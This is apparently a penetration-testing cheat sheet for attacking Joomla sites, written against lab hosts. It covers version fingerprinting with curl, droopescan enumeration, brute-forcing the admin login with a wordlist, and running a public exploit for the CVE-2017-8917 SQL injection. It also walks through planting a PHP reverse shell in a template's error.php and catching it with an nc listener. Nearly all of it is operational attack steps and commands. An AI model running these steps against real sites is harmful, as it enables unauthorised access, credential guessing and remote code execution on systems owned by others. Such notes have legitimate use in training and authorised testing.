- `Admin page - /administrator`
- `Configuration files configuration.php | diagnostics.php | joomla.inc.php | config.inc.php`

### General Information
```bash
# Checking if Joomla
curl -s http://dev.inlanefreight.local/ | grep Joomla

# Check for robots.txt
http://dev.inlanefreight.local/robots.txt

# Check for README.txt
curl -s http://dev.inlanefreight.local/README.txt | head -n 5

# To find the Joomla version
http://10.10.8.222/language/en-GB/en-GB.xml
```

### Enumeration
```bash
sudo pip3 install droopescan
droopescan scan joomla --url http://dev.inlanefreight.local


# Brute Force Admin Login
sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

### Joomla  version 3.7.0 (CVE-2017-8917 SQL injection)

1. Clone the Exploit Repository
https://github.com/stefanlucas/Exploit-Joomla

2. Run the Exploit Script
```
python3 joomblah.py  http://10.10.8.222/
```

### Reverse Shell

- Log in to the **Joomla admin dashboard**.
- Go to **Extensions > Templates** and select the active template i.e (**Protostar Details and Files**).
- Edit the `error.php` file and paste the **Pentestmonkey PHP reverse shell** code.
- Set up a listener on your attacker machine `rlwrap -f . -r nc -nvlp 4444`
- Now, to execute our payload, open a web browser and navigate to `http://<IP>/templates/protostar/error.php.`